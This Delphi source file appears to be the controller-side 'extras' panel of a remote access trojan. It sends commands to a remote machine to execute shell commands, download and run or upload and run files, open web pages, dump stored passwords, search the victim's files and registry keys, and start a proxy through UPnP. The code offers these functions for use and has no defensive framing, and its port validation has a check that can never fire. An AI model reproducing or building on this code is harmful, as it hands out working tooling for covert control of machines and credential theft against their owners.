unit UnitFrameAllExtras;

interface

uses
  StrUtils,Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, UnitMain, StdCtrls, sCheckBox, sLabel, ExtCtrls, VirtualTrees,
  sFrameAdapter, sGroupBox, Buttons, UnitConexao;

type
  TFrameAllExtras = class(TFrame)
    sWebLabel1: TsWebLabel;
    sWebLabel2: TsWebLabel;
    sWebLabel3: TsWebLabel;
    sWebLabel4: TsWebLabel;
    sWebLabel5: TsWebLabel;
    sWebLabel6: TsWebLabel;
    sWebLabel7: TsWebLabel;
    sFrameAdapter1: TsFrameAdapter;
    RadioGroup1: TsRadioGroup;
    OpenDialog1: TOpenDialog;
    sWebLabel8: TsWebLabel;
    sSpeedButton1: TSpeedButton;
    sSpeedButton2: TSpeedButton;
    sSpeedButton3: TSpeedButton;
    sSpeedButton4: TSpeedButton;
    sSpeedButton5: TSpeedButton;
    sSpeedButton6: TSpeedButton;
    sSpeedButton7: TSpeedButton;
    sSpeedButton8: TSpeedButton;
    procedure sWebLabel1Click(Sender: TObject);
  private
    { Private declarations }
    Servidor: TConexaoNew;
    procedure ExecutarComandos;
    procedure BaixarExecutar;
    procedure AbrirInternet;
    procedure EnviarExecutar;
    procedure Senhas;
    procedure ProcurarArquivos;
    procedure ProcurarKey;
    procedure ProxyStart;
    procedure ProxyStop;
  public
    { Public declarations }
    constructor Create(aOwner: TComponent; ConAux: TConexaoNew); overload;
  end;

implementation

{$R *.dfm}

uses
  UnitAll,
  UnitStrings,
  UnitConstantes,
  UnitCommonProcedures,
  UnitFileSearch,
  UnitKeySearch,
  UnitPasswords;

constructor TFrameAllExtras.Create(aOwner: TComponent; ConAux: TConexaoNew);
begin
  inherited Create(aOwner);
  Servidor := ConAux;
  RadioGroup1.Font.Color := clTeal;
end;

procedure TFrameAllExtras.ProxyStart;
var
  i: integer;
  Command: string;
begin
  application.ProcessMessages;

  Command := FormMain.LastProxyPort;

  if inputquery('Proxy', pwidechar(traduzidos[132]), Command) = false then exit;

  try
    i := StrToInt(Command);
    except
    MessageBox(Handle, pchar(traduzidos[133]), 'Proxy', MB_ICONERROR);
    exit;
  end;

  if (i <= 0) and (i > 65535) then
  begin
    MessageBox(Handle, pchar(traduzidos[133]), 'Proxy', MB_ICONERROR);
    exit;
  end;

  FormMain.LastProxyPort := Command;

  if (Servidor.IPWAN <> Servidor.IPLAN) and
     (Servidor.IPLAN <> '127.0.0.1') then //Upnp
  Servidor.EnviarString(unitConstantes.PROXYSTART + '|' + FormMain.LastProxyPort + '|' + 'T') else
  Servidor.EnviarString(unitConstantes.PROXYSTART + '|' + FormMain.LastProxyPort + '|' + 'F');
end;

procedure TFrameAllExtras.ProxyStop;
begin
  Servidor.EnviarString(unitConstantes.PROXYSTOP + '|');
end;

procedure TFrameAllExtras.ProcurarKey;
var
  Command: string;
  i: integer;
begin
  application.ProcessMessages;
  Command := FormMain.LastKeySearch;
  if inputquery(pwidechar(traduzidos[522]), pwidechar(traduzidos[523]), Command) = false then exit;
  if Command = '' then exit;
  FormMain.LastKeySearch := Command;

  application.ProcessMessages;
  FormKeySearch.AdvProgressBar1.Position := 0;
  FormKeySearch.AdvProgressBar1.Max := 1;
  FormKeySearch.AdvListView1.Items.BeginUpdate;
  if FormKeySearch.AdvListView1.Items.Count > 0 then FormKeySearch.AdvListView1.Items.Clear;
  FormKeySearch.AdvListView1.Items.EndUpdate;
  FormKeySearch.Show;

  Servidor.EnviarString(KEYSEARCH + '|' + FormMain.LastKeySearch);
end;

procedure TFrameAllExtras.ProcurarArquivos;
var
  Command: string;
  i: integer;
begin
  application.ProcessMessages;
  Command := FormMain.LastFileSearch;
  if inputquery(pwidechar(traduzidos[321]), pwidechar(traduzidos[524]), Command) = false then exit;
  if Command = '' then exit;

  if (posex('\', Command) > 0) or
     (posex('/', Command) > 0) or
     (posex(':', Command) > 0) or
     (posex('?', Command) > 0) or
     (posex('"', Command) > 0) or
     (posex('<', Command) > 0) or
     (posex('>', Command) > 0) or
     (posex('|', Command) > 0) then
  begin
    Messagebox(Handle, pchar(traduzidos[525]), pchar(NomeDoPrograma + ' ' + VersaoDoPrograma), MB_ICONWARNING + MB_OK);
    exit;
  end;

  FormMain.LastFileSearch := Command;

  application.ProcessMessages;

  FormFileSearch.AdvProgressBar1.Position := 0;
  FormFileSearch.AdvProgressBar1.Max := 1;
  FormFileSearch.AdvListView1.Items.BeginUpdate;
  if FormFileSearch.AdvListView1.Items.Count > 0 then FormFileSearch.AdvListView1.Items.Clear;
  FormFileSearch.AdvListView1.Items.EndUpdate;
  FormFileSearch.Show;

  Servidor.EnviarString(FILESEARCH + '|' + FormMain.LastFileSearch);
end;


procedure TFrameAllExtras.Senhas;
var
  i: integer;
begin
  application.ProcessMessages;
  FormPasswords.AdvProgressBar1.Position := 0;
  FormPasswords.AdvProgressBar1.Max := 1;
  FormPasswords.AdvListView1.Items.BeginUpdate;
  if FormPasswords.AdvListView1.Items.Count > 0 then FormPasswords.AdvListView1.Items.Clear;
  FormPasswords.AdvListView1.Items.EndUpdate;
  FormPasswords.Show;

  Servidor.EnviarString(GETPASSWORDS + '|');
end;

procedure TFrameAllExtras.EnviarExecutar;
var
  FileSize: int64;
  i: integer;
begin
  OpenDialog1.Title := NomeDoPrograma + ' ' + VersaoDoPrograma;
  OpenDialog1.InitialDir := ExtractFilePath(Paramstr(0));
  OpenDialog1.FileName := '';
  OpenDialog1.Filter := 'All files(*.*)|*.*';

  if (opendialog1.Execute = true) and (fileexists(opendialog1.FileName) = true) then
  begin
    FileSize := GetFileSize(OpenDialog1.FileName);
    if FileSize = 0 then exit;

    Servidor.EnviarString(UPLOADANDEXECUTE + DelimitadorComandos + OpenDialog1.FileName);
  end;
end;

procedure TFrameAllExtras.AbrirInternet;
var
  i: integer;
  Name: string;
begin
  application.ProcessMessages;
  name := FormMain.LastOpenWeb;
  if inputquery(pwidechar(traduzidos[181]), pwidechar(traduzidos[182]), name) = false then exit;
  FormMain.LastOpenWeb := Name;

  Servidor.EnviarString(OPENWEB + DelimitadorComandos + FormMain.LastOpenWeb);
end;

procedure TFrameAllExtras.ExecutarComandos;
var
  i: integer;
  Name: string;
begin
  application.ProcessMessages;
  name := FormMain.LastExecuteCommand;
  if inputquery(pwidechar(traduzidos[176]), pwidechar(traduzidos[177]), name) = false then exit;
  FormMain.LastExecuteCommand := Name;
  Servidor.EnviarString(EXECCOMANDO + DelimitadorComandos + FormMain.LastExecuteCommand);
end;

procedure TFrameAllExtras.BaixarExecutar;
var
  i: integer;
  Name: string;
begin
  application.ProcessMessages;
  name := FormMain.LastDownExec;
  if inputquery(pwidechar(traduzidos[179]), pwidechar(traduzidos[180]), name) = false then exit;
  FormMain.LastDownExec := Name;
  Servidor.EnviarString(DOWNEXEC + DelimitadorComandos + FormMain.LastDownExec);
end;

procedure TFrameAllExtras.sWebLabel1Click(Sender: TObject);
var
  i: integer;
begin
  i := -1;
  if (Sender is TsWebLabel) then i := (Sender as TsWebLabel).Tag else
  if (Sender is TSpeedButton) then i := (Sender as TSpeedButton).Tag;

  case i of
    0:
      ExecutarComandos;
    1:
      BaixarExecutar;
    2:
      AbrirInternet;
    3:
      EnviarExecutar;
    4:
      Senhas;
    5:
      ProcurarArquivos;
    6:
      ProcurarKey;
    7:
      if RadioGroup1.ItemIndex = 0 then ProxyStart else
      if RadioGroup1.ItemIndex = 1 then ProxyStop;
  end;
end;

end.
